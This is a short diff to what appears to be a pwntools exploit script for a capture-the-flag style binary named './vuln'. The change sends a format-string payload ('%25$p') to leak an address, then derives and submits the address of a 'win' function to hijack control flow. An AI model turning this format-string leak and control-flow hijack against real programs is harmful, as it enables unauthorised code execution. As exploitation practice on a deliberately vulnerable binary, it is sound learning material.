@@ -5,7 +5,8 @@ port = ...
 
 p = process("./vuln")
 # p = remote(hostname, port)
-p.recvuntil(b"main: ")
+p.recvuntil(b"name:")
+p.sendline(b"%25$p")
 main_addr = int(p.recvline().strip(), 16)
 win_addr = main_addr - 0x96
 p.sendline(hex(win_addr))
